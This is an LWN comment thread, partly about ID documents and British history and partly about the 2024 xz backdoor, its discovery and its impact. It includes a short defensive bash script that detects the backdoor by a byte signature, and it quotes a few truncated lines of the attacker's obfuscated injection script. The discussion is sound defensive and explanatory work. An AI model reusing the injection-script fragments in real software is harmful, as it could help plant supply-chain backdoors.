[[Link](/Articles/968745/)] (20 responses)

It worth noting that from a technical aspect there's less difference between passports and ID cards than you might think. National ID cards in europe often have the same NFC chip as the passports and they work the same way. The only real reason you need a passport outside the EU is because many countries want to (a) put stamps in your passport, (b) add physical visas to them and (c) be able to look at your passport to see if you've visited any countries they don't like. That's why countries near the EU where there are no visa requirements will accept national ID cards at immigration. (The Dutch ID card is acceptable for travel to 42 countries.)

As digital visas become more common there will be more countries that will accept ID cards in lieu of passports.

It's possible to use all this infrastructure in positive ways. For example, it would allow Github to have proof you are over 18 and a resident of country X, without revealing any other information about you (zero-knowledge proofs). We're not there yet.

Of course the next step is to ditch the physical card altogether and have it all in your phone instead. Of course that gets trickier, because a passport/ID card provides offline unrecorded proof of validity, but it's not clear if a pure digital app based identity can work offline.

### Verify the identity of developers

Posted Apr 6, 2024 22:05 UTC (Sat)
by **pizza** (subscriber, #46)
[[Link](/Articles/968748/)] (19 responses)

>It's worth noting that from a technical aspect there's less difference between passports and ID cards than you might think. National ID cards in europe often have the same NFC chip as the passports and they work the same way.

...Well, that's great for Europeans, but what about the rest of the world?

(again, that's my point -- Passports have an international standard for machine readability and interoperability, but there are more standards for domestic identification than there are countries! I have a US passport, a second Federal-issued ID, and a state-issued ID. They are all machine-readable, but via different mechanisms, and the encoded information also differs. The passport establishes citizenship. The state ID establishes residency and permission to operate a motor vehicle on public roads)

### Verify the identity of developers

Posted Apr 7, 2024 15:53 UTC (Sun)
by **kleptog** (subscriber, #1183)
[[Link](/Articles/968801/)] (18 responses)

> They are all machine-readable, but via different mechanisms, and the encoded information also differs.

Ok, but this is a fabricated problem. The states of the US could surely get together and adopt a single standard to cover everything. Clearly it's not a big enough problem.

If your point is that requiring digital identification online for open-source projects would unfairly exclude much of the world, I agree with you. That's not something we can reasonably require at this point (perhaps ever).

### Verify the identity of developers

Posted Apr 7, 2024 17:00 UTC (Sun)
by **pizza** (subscriber, #46)
[[Link](/Articles/968808/)] (17 responses)

> Ok, but this is a fabricated problem. The states of the US could surely get together and adopt a single standard to cover everything. Clearly it's not a big enough problem.

There is a federal standard for state ID cards now (imposed by the "REAL ID Act" but twenty years later it's still not fully deployed, and IIRC that \_still\_ doesn't provide a standard mechanism for machine readability or verification.

It's "not a big enough problem" because these ID cards are only used physically, in person, using the mk-I eyeball to make sure the photo vaguely looks like the person holding it.

> If your point is that requiring digital identification online for open-source projects would unfairly exclude much of the world, I agree with you. That's not something we can reasonably require at this point (perhaps ever).

Yes, except it's not "much of the world" so much as "everyone that doesn't live in a jurisdiction that provides state-issued digital identification along with a low/zero-cost mechanism for arbitrary third parties (including those outside your jurisdiction) to validate said credentials." IIUC hardly anywhere qualifies in that respect.

### Verify the identity of developers

Posted Apr 7, 2024 17:46 UTC (Sun)
by **pizza** (subscriber, #46)
[[Link](/Articles/968815/)]

> and IIRC that \_still\_ doesn't provide a standard mechanism for machine readability or verification.

Whoops, I stand corrected. It wasn't part of the original law, but instead as regulations issued by the DHS after the fact. So, currently REAL-ID compliant cards must have a PDF417 2D bar code containing a minimum of 10 data elements [1]. Notably missing is a digital signature that one can use to \_validate\_ the data without some sort of query to the issuing authority, so absent that query, these ID cards are only useful for in-person stuff since you can photoshop anything you want onto the front (photo, text) and back (barcode) and nobody would be any the wiser.

(Nearly all of the REAL-ID provisions have to do with physical/anti-tamper security (eg watermarks, holograms) and a consistent minimum standard for documentation needed to issue said ID, and the information that needs to be shown..)

(Meanwhile, various federal agencies (including the military) have their own ID standards that use different machine readable mechanisms and encoded data..)

[1] legal name, gender, DOB, address of residence, etc. See <https://www.law.cornell.edu/cfr/text/6/37.19>

### Verify the identity of developers

Posted Apr 7, 2024 20:51 UTC (Sun)
by **Wol** (subscriber, #4433)
[[Link](/Articles/968834/)] (15 responses)

> Yes, except it's not "much of the world" so much as "everyone that doesn't live in a jurisdiction that provides state-issued digital identification along with a low/zero-cost mechanism for arbitrary third parties (including those outside your jurisdiction) to validate said credentials." IIUC hardly anywhere qualifies in that respect.

In the UK, it certainly isn't mandatory. The ONLY piece of ID that all British Nationals can be reasonably assumed to possess is a birth certificate. That's assuming their parents registered the birth. Anything beyond that is OPTIONAL, although living without it can be hard. If you haven't had to renew your driving licence for one reason or another, the old green paper version is still valid. There probably aren't that many left, though. My passport is not a proper biometric one (it's also no longer valid), but if anybody wants a passport for ID I would quite happily present it and say "if that's not good enough, it's the best I've got".

More and more, if people demand things off of me (mobile phone number especially), I just walk away ...

Cheers,

Wol

### Verify the identity of developers

Posted Apr 8, 2024 21:31 UTC (Mon)
by **kleptog** (subscriber, #1183)
[[Link](/Articles/969058/)] (14 responses)

> if anybody wants a passport for ID I would quite happily present it and say "if that's not good enough, it's the best I've got".

I hope it is for you too. The UK has a weird view on IDs. On the one hand they recognise the benefits, on the other hand whenever it's proposed they always talk about being required to carry them at all times. Which is basically insane and a way to sink the topic before it gets anywhere.

A national ID is physical proof you are allowed to be there and have certain rights. So if some government database has a glitch and suddenly decides you're an illegal immigrant (e.g. Windrush, EUSS, the current PCDP scandal at the Home Office) you have physical proof that the database is \*wrong\*. Good for preventing you getting deported. That such a card is useful in other contexts is bonus.

From a pure practical point, my bank can assert my nationality just as well as the government can. You don't necessarily need passports/ID cards for that.

### Verify the identity of developers

Posted Apr 9, 2024 9:02 UTC (Tue)
by **farnz** (subscriber, #17727)
[[Link](/Articles/969102/)] (13 responses)

One of the issues in the UK with national ID cards is that whenever the idea comes up, the intent is to fund the cards via other uses of the data contained therein. Being required to carry them at all times is just a consequence of the idea that national ID cards need to turn a profit for the government.

### Verify the identity of developers

Posted Apr 9, 2024 9:53 UTC (Tue)
by **Wol** (subscriber, #4433)
[[Link](/Articles/969107/)] (12 responses)

One of the other issues we have is that the UK is not a single nation - and it's dominated by the "little englanders".

Has anybody else noticed that - of the four nations - England is the only one without its own National Anthem?

Driven home when watching the Calcutta Cup - the Scots sing "Flower of Scotland", but the English sing "God Save the (Scottish) King" !!!

It's the same problem the Canadians and Mexicans have with North America / USA, and the English seem completely oblivious to it ...

Cheers,

Wol

### Verify the identity of developers

Posted Apr 9, 2024 15:06 UTC (Tue)
by **rschroev** (subscriber, #4164)
[[Link](/Articles/969180/)] (6 responses)

England is also the only one without its own parliament. It's almost as if England still feels the whole UK is theirs, with the other members subordinate instead of them all being on the same level.

### Verify the identity of developers

Posted Apr 10, 2024 10:01 UTC (Wed)
by **paulj** (subscriber, #341)
[[Link](/Articles/969253/)] (5 responses)

An artifact of how the UK avoids properly addressing its constitutional issues, instead sating discontent in the non-English parts by a series of more ad-hoc "devolution" of powers from Westminster to other parliaments, seeking to react to events with the minimum of change.

It started with Ireland, which got a devolved government and dominion status within the UK in 1922 with some powers reserved for Westminster and an "Executive Council" (similarish to the privy council), until 1931 when Ireland became a wholly autonomous dominion, and then to 1937 as "Eire" a self-declared independent state (dominion status ambiguous), and formally as the Republic of Ireland from 1948.

Scotland and Wales got their own devolution in 1999, both more proscribed than the original Irish Free State (which had taken armed insurrection), but each with continued representation via MPs in Westminster. I'm not sure about the differences in power between them. The Scottish parliament seems to me to have more "status" and power than the Welsh one, but that might just be my bias, having lived in Scotland - I don't know much about Welsh devolution and how it compares.

It seems to me Ireland has the healthier status of the 4 "home nations", as they were (ignoring the Troubles, arising from Elizabethan and Jacobean era United Kingdom politics, which due to historical quirks left a longer, stronger imprint in the north of Ireland than the rest of the UK). Ireland continues to have very strong bilateral links to the rest of the Celtic Isles - Irish and British citizens travel and settle freely between them, trade a little less so now thanks to BrExit though, there are bilateral institutions, etc. - while Ireland is ultimately able to decide its own fate.

I don't understand why Scotland, if not Wales, doesn't also seek a similar situation. Would be better for all in the end I think. (I did vote "Yes" in the IndyRef in Scotland. ;) ).

### Verify the identity of developers

Posted Apr 10, 2024 11:23 UTC (Wed)
by **Wol** (subscriber, #4433)
[[Link](/Articles/969265/)] (4 responses)

> Scotland and Wales got their own devolution in 1999, both more proscribed than the original Irish Free State (which had taken armed insurrection), but each with continued representation via MPs in Westminster. I'm not sure about the differences in power between them. The Scottish parliament seems to me to have more "status" and power than the Welsh one, but that might just be my bias, having lived in Scotland - I don't know much about Welsh devolution and how it compares.

Being interested in history, I think this goes back to the fact that England and Scotland were two separate nations (let's forget the Flower of Scotland Proud Edward's Army bit) until very recently. Until William's intervention in 1066, the assorted British nations were steadily coalescing of their own accord, take for example the agreement round about 900AD between - iirc - Mercia, Northumbria and Wessex that all three crowns would pass to whichever King survived longest.

Then William arrived and upset the applecart, setting out to unite the British Isles by force. Out of proto-England, Wales held out the longest which forged a separate nationality (quite possibly helped by the fact that the Anglo-Saxon nations fell rather more easily, the Welsh being Celtic so already feeling different). But Wales has always been part of "England" since the mid 1100s (and sort-of took over the English crown with Owain Tudor about 1500).

Scotland has always had a separate identity - again being Gaelic rather than Anglo-Saxon (although the Sassenachs are "Lowland Scots" aka Angles"). Again fuelled by constant conflict with the Normans to the south. And with their own monarchy (which Wales never had?) since pre-William - again going back to 900s and earlier - which left alone would probably have merged with England using a similar mechanism. But it wasn't to be.

So Scotland was either occupied, or completely independent, until the "Union of the Crowns" in 1603. It remained an independent (theoretically) country until about 1750 and the "Act of Union".

So basically, Scotland has more power and independence because Scotland is considered a nation/country. Wales is just a subordinate principality.

(And personally, I think Westminster has far too much power. A lot of it should be devolved to local government. But it's the standard ebb and flow of politics unfortunately - the centre grabs power, messes it up, and the regions grab it back. Rinse and repeat :-(

Cheers,

Wol

### Verify the identity of developers

Posted Apr 10, 2024 12:59 UTC (Wed)
by **paulj** (subscriber, #341)
[[Link](/Articles/969315/)] (3 responses)

Interesting... ;)

As an aside, I note your view of the history seems skewed towards the countries /currently/ part of the UK. You can't understand the history of these Celtic Isles without understanding the history of one of the larger chunks of it, and a kingdom of the king of England for longer than Scotland - Ireland. Some of the biggest battles relevant to the history of the kingdom of England (and to the history of Europe, to a certain extent) were fought in... Ireland (by soldiers from many nations).

Just saying, cause a lot of modern British seem to overlook it - just cause Ireland is no longer part of the UK.

### Verify the identity of developers

Posted Apr 10, 2024 15:04 UTC (Wed)
by **Wol** (subscriber, #4433)
[[Link](/Articles/969351/)] (1 responses)

Agreed I don't know an awful lot about Ireland. Bear in mind I consider myself European/Scottish although my wife insists I'm English, so that accounts for at least some of the bias.

I also know there's an awful lot of history roundabout the time of Cromwell and Cromwell :- ) that's Thomas Cromwell of Henry VIII fame for the first one :-) but I know very little about it, other than it was the age-old Catholic/Protestant mess. (And quite likely earlier, too.)

The other thing that often gets forgotten about medieval history is the "Joan of Arc vs the English" lie. Okay, Joan is a bit later than this, but King John (of Magna Carta fame, 1215) is probably the first true "King of England". Before that, and including his elder brother Richard, the title of Duke of Normandy actually ranked ABOVE the King of England. Richard's troubles in the Crusades basically brought about the downfall of the Norman Empire, and Joan drove the Normans out of Normandy (probably a gross mis-representation of what actually happened, but rather more accurate than folk history!)

Cheers,

Wol

### Verify the identity of developers

Posted Apr 11, 2024 9:12 UTC (Thu)
by **paulj** (subscriber, #341)
[[Link](/Articles/969417/)]

King John possibly succeeded - despite himself - in part thanks to having Ireland to draw wealth from. Without Ireland, he'd have had nothing early on ("John Lackland" - John no-land), and would have been less wealthy later. He might have struggled to hold the English crown against his nephew Arthur and Philip II of France.

### Verify the identity of developers

Posted Apr 10, 2024 15:19 UTC (Wed)
by **Wol** (subscriber, #4433)
[[Link](/Articles/969358/)]

Just to throw in another snippet, to help explain the Saxon / William thing - Saxon kings were elected. William's pretence for invasion was that he had been promised the crown, which was half true, but it was never in the gift of the promissors.

And that's how the treaty between the three kings worked - the ruling councils basically signed up that the only eligible candidates for any vacant monarchy would be the other monarchs. All helped by the fact that the crowns did NOT pass father to son, although the only real candidates were all close relatives of the late King.

Indeed, George II may have been the first King to inherit as of legal right, given the shenanigans in the aftermath of Henry VIII and Edward VI, and the similar shenanigans over James II, William and Mary, and Anne. Indeed, after the death of his wife, William III ruled alone despite not being of (British) Royal Blood at all! Using him as precedent, we should have had King Albert, and King Philip! (Although of course, Philip was of British Royal Blood, as also reputedly is Camilla.)

Cheers,

Wol

### Verify the identity of developers

Posted Apr 9, 2024 15:39 UTC (Tue)
by **anselm** (subscriber, #2796)
[[Link](/Articles/969182/)]

> *the Scots sing "Flower of Scotland"*

So far that's just a patriotic song popular with Scottish sports fans which various Scottish sports bodies have provisionally adopted in the absence of an actual national anthem (which Scotland doesn't have, either).

Having said that, in spite of its obvious problems *Flower of Scotland* is apparently a strong contender to *become* the official national anthem once the Scottish parliament gets its act together. As far as the English are concerned, they should be bothered by the fact that they have no national *parliament* (or for that matter government) much more than by the formal absence of a national anthem.

### Verify the identity of developers

Posted Apr 10, 2024 9:27 UTC (Wed)
by **paulj** (subscriber, #341)
[[Link](/Articles/969252/)] (3 responses)

King Big Ears is German, not Scottish. ;)

### Verify the identity of developers

Posted Apr 11, 2024 9:42 UTC (Thu)
by **Wol** (subscriber, #4433)
[[Link](/Articles/969426/)] (2 responses)

Well, he is directly descended from the Scottish King James VI/I ...

(So he's as Scottish as most other people in Scotland :-) which is to say not really at all. Most residents of modern Scotland (a) do not live in the Land of the Scots, and (b) trace their ancestry to either the Picts or the Angles.

(Inasmuch as most people in the British Isles trace their ancestry back to the Anglo-Saxons - genetically we're nearly all Britons, but culturally we're Anglo-Saxon because we adopted the ruling class's language and culture. That's where the word "Welsh" came from - aka "not Anglo Saxon".)

Cheers,

Wol

### Verify the identity of developers

Posted Apr 11, 2024 10:17 UTC (Thu)
by **paulj** (subscriber, #341)
[[Link](/Articles/969428/)] (1 responses)

He's descended from the \*German\* George I and II from /both/ his mother and father :). George I's is also german on /both/ sides, even if his mother was a Stuart - "Sophia of Hanover". Her mother, Elizabeth Stuart was born in Scotland to James VI / I, but her mother was Danish.

It's a bit of a stretch to call Big Ears "Scottish" because, in between the plethora of German ancestors, you can find one couple who were Scottish and Danish a few hundred years ago. ;)

### Verify the identity of developers

Posted Apr 11, 2024 11:12 UTC (Thu)
by **Wol** (subscriber, #4433)
[[Link](/Articles/969433/)]

What about Lady Elizabeth Bowes-Lyon?

Cheers,

Wol

### Verify the identity of developers

Posted Apr 5, 2024 19:38 UTC (Fri)
by **gioele** (subscriber, #61675)
[[Link](/Articles/968618/)]

> In some countries within the Schengen area (\*cough\* Germany) citizens are required to be in possession of an ID card (or passport) even within their own country.

Formally, Germany requires you to "possess" an identity document ("verpflichtet, einen gültigen Ausweis zu besitzen" = to have applied for it and to have it somewhere, for example at home) once you are 16. It is not required that you "are in possession" of an identity document (~= to carry with you).

[https://www.gesetze-im-internet.de/pauswg/BJNR134610009.h...](https://www.gesetze-im-internet.de/pauswg/BJNR134610009.html#BJNR134610009BJNE000205116)

[https://www.gesetze-im-internet.de/englisch\_pauswg/englis...](https://www.gesetze-im-internet.de/englisch_pauswg/englisch_pauswg.html#p0014)

### Verify the identity of developers

Posted Apr 4, 2024 22:47 UTC (Thu)
by **farnz** (subscriber, #17727)
[[Link](/Articles/968494/)]

They don't even do that - all my passport actually does is establish that if someone presents it to you as "their" passport, and you don't believe them, you can hand them over to my country of origin, and my country of origin will arrange my return home (if it's me presenting the passport) and bill me for it later, or will arrest the person, bring them to my country of origin, and then prosecute them for using my passport while not being me, with potential for significant jail time over here.

In particular, for the purposes of holding me accountable for actions, my passport is *less* valuable than my purported name and e-mail address. If those aren't enough, my passport details are not; my country does not issue ID cards as a matter of course, and I therefore have no documentation that establishes my identity for the purposes of accountability.

Better yet, I'm allowed multiple passports as long as I am not using them to defraud the government. The details on my passport don't have to be my "legal" name, since there is no such thing - they just have to be a name that I use in the course of business. I could get a passport in the name "Linus Benedict Torvalds" quite legitimately, as long as I can show the government that I use that name regularly.

### A backdoor in xz

Posted Mar 29, 2024 21:50 UTC (Fri)
by **dilinger** (subscriber, #2867)
[[Link](/Articles/967258/)]

I would certainly welcome this, but boy is that going to be a fun challenge for chromium and other packages that embed chromium..

### A backdoor in xz

Posted Mar 29, 2024 22:09 UTC (Fri)
by **mdeslaur** (subscriber, #55004)
[[Link](/Articles/967267/)] (1 responses)

I don't think anyone would have noticed the malicious code even if he did check it into git. In fact, this was easily spotted \_because\_ the tarball didn't match the git repo.

### A backdoor in xz

Posted Mar 30, 2024 7:42 UTC (Sat)
by **epa** (subscriber, #39769)
[[Link](/Articles/967351/)]

I guess the attacker had the choice of putting the code into git, but chose to modify the tarball only, because he thought it would be less detected that way. A commit in git would certainly be more visible.

### A backdoor in xz

Posted Mar 29, 2024 18:00 UTC (Fri)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967188/)] (23 responses)

> After observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors) I figured out the answer

We were pretty much on the brink of disaster, and got saved because someone's login got slowed down enough that they went "mmh hang on a sec". It seems to me we just got very, very lucky here. Will we be so lucky the next time this happens too?

### A backdoor in xz

Posted Mar 29, 2024 18:08 UTC (Fri)
by **AdamW** (subscriber, #48457)
[[Link](/Articles/967190/)] (6 responses)

Or were we so lucky the last time it happened?

### A backdoor in xz

Posted Mar 29, 2024 18:16 UTC (Fri)
by **alex** (subscriber, #1355)
[[Link](/Articles/967193/)] (5 responses)

It would be hubris to assume this is the first or only attempt to subvert an upstream so far.

### A backdoor in xz

Posted Mar 30, 2024 4:26 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967331/)] (3 responses)

Also, don't forget to blame the messenger when there is one: <https://lwn.net/Articles/853717/>

### A backdoor in xz

Posted Mar 30, 2024 6:07 UTC (Sat)
by **ssmith32** (subscriber, #72404)
[[Link](/Articles/967337/)] (2 responses)

There's being a messenger, and then there's wasting maintainer time trying to get a paper written about something everyone knows is a problem[1] by failing to get malicious code past them. Which, of course, just contributes to the overall problem of overworked maintainers that is the real root cause of the issue being covered above [2].

So, yeah excluding people from the community that are more interested in their own academic careers rather than genuinely helping - that's not "shooting the messenger".

[1]<https://m.youtube.com/watch?v=fu8ZNRDQsi8&t=6771s>

[2][https://www.mail-archive.com/xz-devel@tukaani.org/msg0057...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00571.html)

### A backdoor in xz

Posted Mar 30, 2024 14:37 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967440/)] (1 responses)

There's nothing wrong with excluding the offenders. There's everything wrong about whining and talking so much about them while saying so little about the actual issue.

### A backdoor in xz

Posted Mar 30, 2024 14:41 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967444/)]

... and yes, maintainers are exhausted but no, that's not the only explanation.

### A backdoor in xz

Posted Mar 30, 2024 11:27 UTC (Sat)
by **jd** (guest, #26381)
[[Link](/Articles/967396/)]

We know it isn't the first. A group of researchers tried to submit exploit-ridden code to the Linux kernel, for example.

There are also packages that have been modified to not work in certain countries, and one Python package got effectively yeeted by the primary maintainer over politics.

And it's reasonable to assume that we only know a small percentage of cases.

Closed source is unlikely to be better. It would seem to me that quite a number of exploits that get discovered seem to be very bizarre backdoors.

If we generalise to all malicious code, then the Sony Rootkit is probably the most notorious.

### A backdoor in xz

Posted Mar 29, 2024 18:27 UTC (Fri)
by **andresfreund** (subscriber, #69562)
[[Link](/Articles/967194/)] (8 responses)

> We were pretty much on the brink of disaster, and got saved because someone's login got slowed down enough that they went "mmh hang on a sec". It seems to me we just got very, very lucky here. Will we be so lucky the next time this happens too?

I didn't even notice it during logging in with ssh or such. I was doing some micro-benchmarking at the time and was looking to quiesce the system to reduce noise. Saw sshd processes were using a surprising amount of CPU, despite immediately failing because of wrong usernames etc. Profiled sshd. Which showed lots of cpu time in code with perf unable to attribute it to a symbol, with the dso showing as liblzma. Got suspicious. Then recalled that I had seen an odd valgrind complaint in my automated testing of postgres, a few weeks earlier, after some package updates were installed. Really required a lot of coincidences.

### A backdoor in xz

Posted Mar 29, 2024 18:37 UTC (Fri)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967195/)]

Ooft. Well done spotting this and chasing it down!

### A backdoor in xz

Posted Mar 29, 2024 18:50 UTC (Fri)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967198/)]

Thank you for your work!

I donated $1000 to Debian for your work. Let's all do something nice for Debian, please?

### A backdoor in xz

Posted Mar 29, 2024 23:34 UTC (Fri)
by **job** (guest, #670)
[[Link](/Articles/967281/)]

Real heroes don't wear capes.

Your curiosity saved us from something so much worse. I wish I could thank you better, eternal gratitude must suffice for now.

### A backdoor in xz

Posted Mar 29, 2024 23:43 UTC (Fri)
by **mcatanzaro** (subscriber, #93033)
[[Link](/Articles/967283/)]

Thank you so much for averting this before it turned into a security apocalypse. This could have been one of the most severe cybersecurity incidents in history, except you got lucky enough to notice something odd and then were curious enough to look closer.

### A backdoor in xz

Posted Mar 30, 2024 2:19 UTC (Sat)
by **helsleym** (guest, #92730)
[[Link](/Articles/967320/)]

Wow! Thank you for pursuing this. So many folks wouldn't notice or would put this on their stack of things to get to later.

### A backdoor in xz

Posted Mar 31, 2024 3:58 UTC (Sun)
by **cozzyd** (guest, #110972)
[[Link](/Articles/967620/)]

So thanks to random botnet ssh login attempts, this was discovered? Somehow strangely karmic.

### A backdoor in xz

Posted Mar 31, 2024 10:22 UTC (Sun)
by **xgongiveittoya** (guest, #165847)
[[Link](/Articles/967649/)]

You have done a huge service for the entire Linux community. Thank you!

### A backdoor in xz

Posted Apr 11, 2024 17:35 UTC (Thu)
by **martijn** (guest, #125289)
[[Link](/Articles/969519/)]

Legend! Remarkable observation.

### A backdoor in xz

Posted Mar 29, 2024 19:10 UTC (Fri)
by **zwenna** (guest, #64777)
[[Link](/Articles/967189/)] (6 responses)

> We were pretty much on the brink of disaster, and got saved because someone's login got slowed down enough that they went "mmh hang on a sec".

I do not think that we actually got saved, at least saying so is premature until the payload has been analyzed in more detail. Right now I assume most Debian developers' machines are compromised.

This might very well be a much worse disaster than the [2008 Debian OpenSSL debacle](https://lwn.net/Articles/282290/), but time will tell.

### A backdoor in xz

Posted Mar 29, 2024 19:28 UTC (Fri)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967207/)] (1 responses)

This was caught before it got in any stable release of any distribution, it's only in development/testing. The only exception is SUSE Tumbleweed, because it's rolling.

Just a few weeks of delay and it would have been part of the new Fedora 40 release and the new Ubuntu LTS 24.04 release.

### A backdoor in xz

Posted Mar 30, 2024 19:47 UTC (Sat)
by **tao** (subscriber, #17563)
[[Link](/Articles/967534/)]

I'd wager that most Debian developers use development/testing for their development systems. So "only" getting into development/testing is still quite bad.

### A backdoor in xz

Posted Mar 29, 2024 19:34 UTC (Fri)
by **branden** (guest, #7029)
[[Link](/Articles/967209/)] (1 responses)

> This might very well be a much worse disaster than the 2008 Debian OpenSSL debacle, but time will tell.

I wonder if we'll see an encore performance from sneering OpenSSL developer Ben Laurie, derogating the diligence and competence of "vendors" (distributors) once again.

[https://web.archive.org/web/20090425084641/https://www.li...](https://web.archive.org/web/20090425084641/https%3A//www.links.org/?p=327)

Think how much better the xz episode could be turning out if we'd simply trusted upstream--the real experts.

### A backdoor in xz

Posted Mar 30, 2024 14:16 UTC (Sat)
by **epa** (subscriber, #39769)
[[Link](/Articles/967427/)]

You can still turn it into a “vendors suck” narrative since the dependency on xz is not there in OpenSSH, nor in the Portable version, but was patched in by Linux distributions.

Of course there is a reason for that — the upstreams don’t want systemd integration as it doesn’t fit their vision for the project. In some friendlier alternative universe upstream could have said “okay we can add the feature, but linking in the whole libsystemd is too much extra stuff to audit: any chance you can provide a slimmer library?”

### A backdoor in xz

Posted Mar 29, 2024 20:50 UTC (Fri)
by **simon.d** (guest, #168021)
[[Link](/Articles/967240/)]

This is exactly why I use a dm-verity to verify my rootfs (built with verity-squash-root). I can get compromised temporarily while online, but I only rebuilt and sign my image while offline on a fresh reboot. Ok, it would have saved me here, but probably not on a different compromise of a package, when already built into my system. Also secrets decrypted while compromised would also be compromised, but at least I can revert back to a secure system.

### A backdoor in xz

Posted Mar 30, 2024 1:07 UTC (Sat)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967304/)]

I doubt "most Debian developers' machines" have publicly accessible SSH. Given that outbound/unprompted network traffic would be easily detectable, I think the assumption going around that you need to be able to access the system remotely to trigger the backdoor is correct.

### A backdoor in xz

Posted Mar 29, 2024 19:26 UTC (Fri)
by **zblaxell** (subscriber, #26385)
[[Link](/Articles/967197/)] (15 responses)

The "script to detect if it's likely that the ssh binary on a system is vulnerable" is some disturbing shell code.

It keeps calling eval on unique (and therefore unset?) variable names. It's moving strings between variable names in the middle, making it harder to read. It's making a whole lot of changes to src/liblzma/Makefile which it doesn't seem to ever use, some of which introduce code that ends in "| $(SHELL)".

If someone showed me the git commits and the detection script and said "one of these contains a trojan, you have ten minutes to decide which"...I'd pick the detection script. Is there a less obfuscated version?

### A backdoor in xz

Posted Mar 29, 2024 19:33 UTC (Fri)
by **rwmj** (subscriber, #5474)
[[Link](/Articles/967211/)]

Are you looking at the right script? You seem to be describing the injection script (written by the attacker). The detection script is just a fancy hexdump | grep.

### A backdoor in xz

Posted Mar 29, 2024 19:34 UTC (Fri)
by **willmo** (subscriber, #82093)
[[Link](/Articles/967213/)]

I don't think LWN processed the attachments correctly. See <https://www.openwall.com/lists/oss-security/2024/03/29/4>

### A backdoor in xz

Posted Mar 29, 2024 19:39 UTC (Fri)
by **daroc** (editor, #160859)
[[Link](/Articles/967214/)] (11 responses)

Unfortunately, the way that the site code handles attachments on mailing list items is a bit flawed, and currently only displays some of the attachments. It's on my list now to look into. I think you were looking at the backdoored m4 script, which is the first attachment on the message. The actual detection script looks like this:

```

#! /bin/bash

set -eu

# find path to liblzma used by sshd
path="$(ldd $(which sshd) | grep liblzma | grep -o '/[^ ]*')"

# does it even exist?
if [ "$path" == "" ]
then
	echo probably not vulnerable
	exit
fi

# check for function signature
if hexdump -ve '1/1 "%.2x"' "$path" | grep -q f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410
then
	echo probably vulnerable
else
	echo probably not vulnerable
fi

```

Which I think you'll agree is much more readable.

### A backdoor in xz

Posted Mar 29, 2024 21:45 UTC (Fri)
by **zblaxell** (subscriber, #26385)
[[Link](/Articles/967253/)] (2 responses)

Wow...so today I get to add to my collection of "mail filtering/transformation worst-case outcomes" examples!
In the LWN version, the text reads:
```

== Detecting if installation is vulnerable ==

Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
system is vulnerable, attached here. Thanks!

Greetings,

Andres Freund
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
[...]

```
so I'm thinking "OK, so it's attached *here*", not "this mailing list archive software dumps random text from a bunch of *extremely* heterogenous MIME parts into the message body without any markup indicating boundaries between sections."

Given the sensitivity, can that be fixed on the LWN archive before someone else makes the same mistake?

### Attachment rendering

Posted Mar 29, 2024 22:09 UTC (Fri)
by **corbet** (editor, #1)
[[Link](/Articles/967268/)] (1 responses)

Is it better now? That code has always sort of punted on attachments, I've tried to make it just a little bit less hackish.

### Attachment rendering

Posted Mar 29, 2024 23:01 UTC (Fri)
by **zblaxell** (subscriber, #26385)
[[Link](/Articles/967278/)]

Much better! The filenames really make all the difference in this case. Even without them, there are now two visible scripts on the page, and it's not hard to see which is the evil one.

Thanks!

### A backdoor in xz

Posted Mar 30, 2024 9:00 UTC (Sat)
by **geuder** (subscriber, #62854)
[[Link](/Articles/967370/)] (3 responses)

The script runs ldd on an untrusted binary. That itself can lead to code execution if the binary is suitably manipulated.

### A backdoor in xz

Posted Mar 30, 2024 9:07 UTC (Sat)
by **geuder** (subscriber, #62854)
[[Link](/Articles/967371/)] (2 responses)

Oops, I might have commented too fast.

sshd is not compromised (at least not by the issue discussed here...), a library it loads is.

I am not sure whether an attack (executing arbitrary code) using ldd needs to start in the main executable or whether it would also work in a shared library used by that executable.

### A backdoor in xz

Posted Mar 30, 2024 14:04 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967424/)] (1 responses)

ldd opens each referenced library, but only to read the ELF header (to find recursive dependencies, I assume).

Thus, unless the build process manages to create a library with a corrupted ELF header that exploits a bug in ldd (which this one doesn't seem to do) the detection script is safe to run.

### A backdoor in xz

Posted Mar 30, 2024 14:49 UTC (Sat)
by **geuder** (subscriber, #62854)
[[Link](/Articles/967447/)]

Yes. The risk I remembered is described in <https://catonmat.net/ldd-arbitrary-code-execution.>

It involves using a different loader, but the loader is specified by the main executable. Shared libraries cannot bring in their own one (AFAIK...).

### A backdoor in xz

Posted Mar 30, 2024 14:56 UTC (Sat)
by **fghorow** (subscriber, #5229)
[[Link](/Articles/967452/)] (2 responses)

I just ran into a case where hexdump was not available on the machine being tested. The script complained about that, but printed the "probably not vulnerable" result anyway. Rather than trying to correct the script and open up another can of worms, please just use common sense when interpreting the output of this script.

### A backdoor in xz

Posted Mar 31, 2024 16:01 UTC (Sun)
by **vegard** (subscriber, #52330)
[[Link](/Articles/967691/)] (1 responses)

Yes, sorry -- it was hacked up in a couple of hours in anticipation of the report going live. The script was tested by 3-4 people in private before it got posted, but it obviously had some flaws. It was also meant for advanced users, in a way (think organizations or system administrators who can adapt it to their systems, not necessarily end users). I felt it was better to keep the script short and readable as opposed to trying to adapt it to every possible configuration, as that would have made it harder trust (as in: here's yet another shell script doing who-knows-what...).

### A backdoor in xz

Posted Mar 31, 2024 16:05 UTC (Sun)
by **fghorow** (subscriber, #5229)
[[Link](/Articles/967692/)]

My comment was made as a "heads up" and it was not intended as criticism of your script.

You absolutely made the right call in keeping it simple, IMHO. Thank you.

### A backdoor in xz

Posted Mar 30, 2024 18:20 UTC (Sat)
by **kreijack** (guest, #43513)
[[Link](/Articles/967501/)]

